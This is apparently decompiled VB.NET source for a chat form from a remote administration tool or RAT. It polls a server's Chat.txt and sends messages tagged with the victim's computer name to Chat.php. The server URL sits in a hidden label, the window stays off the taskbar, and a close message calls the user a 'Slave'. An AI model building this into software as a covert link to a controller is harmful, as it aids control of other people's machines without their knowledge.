Imports Microsoft.VisualBasic.CompilerServices
Imports My
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

<DesignerGenerated> _
Public Class Form4
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Form4_FormClosing)
        AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form4_Load)
        Dim list As List(Of WeakReference) = Form4.__ENCList
        SyncLock list
            Form4.__ENCList.Add(New WeakReference(Me))
        End SyncLock
        Me.SendChat = New WebClient
        Me.GetChat = New WebClient
        Me.a = ""
        Me.b = ""
        Me.InitializeComponent
    End Sub

    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
        Try 
            Me.TextBox2.Text = (Me.TextBox2.Text & ChrW(13) & ChrW(10) & "[]")
            Me.SendChat.DownloadString(String.Concat(New String() { Me.Label1.Text, "/Chat.php?c=", MyProject.Computer.Name, " : ", Me.TextBox2.Text }))
            Me.TextBox2.Clear
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    <DebuggerNonUserCode> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try 
            If (disposing AndAlso (Not Me.components Is Nothing)) Then
                Me.components.Dispose
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    Private Sub Form4_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
        Try 
            Me.TextBox2.Text = ChrW(13) & ChrW(10) & "[]"
            Me.SendChat.DownloadString(String.Concat(New String() { Me.Label1.Text, "/Chat.php?c=[-Slave ", MyProject.Computer.Name, " Closed the chat -]", Me.TextBox2.Text }))
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError
        End Try
    End Sub

    Private Sub Form4_Load(ByVal sender As Object, ByVal e As EventArgs)
    End Sub

    Public Sub GetChatData()
        Me.b = Me.GetChat.DownloadString((Me.Label1.Text & "/Chat.txt"))
        If (Me.a <> Me.b) Then
            Me.a = Me.b
            Me.TextBox1.Text = Me.b.ToString
        End If
    End Sub

    <DebuggerStepThrough> _
    Private Sub InitializeComponent()
        Me.components = New Container
        Me.TextBox1 = New TextBox
        Me.TextBox2 = New TextBox
        Me.Button1 = New Button
        Me.Timer1 = New Timer(Me.components)
        Me.Label1 = New Label
        Me.SuspendLayout
        Me.TextBox1.BackColor = Color.Black
        Me.TextBox1.BorderStyle = BorderStyle.FixedSingle
        Me.TextBox1.Dock = DockStyle.Top
        Me.TextBox1.ForeColor = Color.FromArgb(&H80, &HFF, &H80)
        Dim point As New Point(0, 0)
        Me.TextBox1.Location = point
        Me.TextBox1.Multiline = True
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.ReadOnly = True
        Dim size As New Size(510, &HE4)
        Me.TextBox1.Size = size
        Me.TextBox1.TabIndex = 0
        Me.TextBox2.BackColor = Color.Black
        Me.TextBox2.BorderStyle = BorderStyle.FixedSingle
        Me.TextBox2.ForeColor = Color.FromArgb(&H80, &HFF, &H80)
        point = New Point(0, &HEA)
        Me.TextBox2.Location = point
        Me.TextBox2.Multiline = True
        Me.TextBox2.Name = "TextBox2"
        size = New Size(&H1AD, &H41)
        Me.TextBox2.Size = size
        Me.TextBox2.TabIndex = 1
        Me.Button1.BackColor = Color.Black
        Me.Button1.FlatStyle = FlatStyle.Flat
        Me.Button1.ForeColor = Color.Gray
        point = New Point(&H1B0, &HEA)
        Me.Button1.Location = point
        Me.Button1.Name = "Button1"
        size = New Size(&H4B, &H41)
        Me.Button1.Size = size
        Me.Button1.TabIndex = 2
        Me.Button1.Text = "SEND"
        Me.Button1.UseVisualStyleBackColor = False
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = &HBB8
        Me.Label1.AutoSize = True
        point = New Point(610, 260)
        Me.Label1.Location = point
        Me.Label1.Name = "Label1"
        size = New Size(0, 13)
        Me.Label1.Size = size
        Me.Label1.TabIndex = 3
        Dim ef As New SizeF(6!, 13!)
        Me.AutoScaleDimensions = ef
        Me.AutoScaleMode = AutoScaleMode.Font
        Me.BackColor = Color.Black
        size = New Size(510, &H12D)
        Me.ClientSize = size
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.Button1)
        Me.Controls.Add(Me.TextBox2)
        Me.Controls.Add(Me.TextBox1)
        Me.FormBorderStyle = FormBorderStyle.FixedSingle
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Form4"
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.TopMost = True
        Me.ResumeLayout(False)
        Me.PerformLayout
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
        Me.GetChatData
    End Sub


    ' Properties
    Friend Overridable Property Button1 As Button
        <DebuggerNonUserCode> _
        Get
            Return Me._Button1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Button)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
            If (Not Me._Button1 Is Nothing) Then
                RemoveHandler Me._Button1.Click, handler
            End If
            Me._Button1 = WithEventsValue
            If (Not Me._Button1 Is Nothing) Then
                AddHandler Me._Button1.Click, handler
            End If
        End Set
    End Property

    Friend Overridable Property Label1 As Label
        <DebuggerNonUserCode> _
        Get
            Return Me._Label1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Label)
            Me._Label1 = WithEventsValue
        End Set
    End Property

    Friend Overridable Property TextBox1 As TextBox
        <DebuggerNonUserCode> _
        Get
            Return Me._TextBox1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As TextBox)
            Me._TextBox1 = WithEventsValue
        End Set
    End Property

    Friend Overridable Property TextBox2 As TextBox
        <DebuggerNonUserCode> _
        Get
            Return Me._TextBox2
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As TextBox)
            Me._TextBox2 = WithEventsValue
        End Set
    End Property

    Friend Overridable Property Timer1 As Timer
        <DebuggerNonUserCode> _
        Get
            Return Me._Timer1
        End Get
        <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
        Set(ByVal WithEventsValue As Timer)
            Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
            If (Not Me._Timer1 Is Nothing) Then
                RemoveHandler Me._Timer1.Tick, handler
            End If
            Me._Timer1 = WithEventsValue
            If (Not Me._Timer1 Is Nothing) Then
                AddHandler Me._Timer1.Tick, handler
            End If
        End Set
    End Property


    ' Fields
    Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
    <AccessedThroughProperty("Button1")> _
    Private _Button1 As Button
    <AccessedThroughProperty("Label1")> _
    Private _Label1 As Label
    <AccessedThroughProperty("TextBox1")> _
    Private _TextBox1 As TextBox
    <AccessedThroughProperty("TextBox2")> _
    Private _TextBox2 As TextBox
    <AccessedThroughProperty("Timer1")> _
    Private _Timer1 As Timer
    Private a As String
    Private b As String
    Private components As IContainer
    Private GetChat As WebClient
    Private SendChat As WebClient
End Class


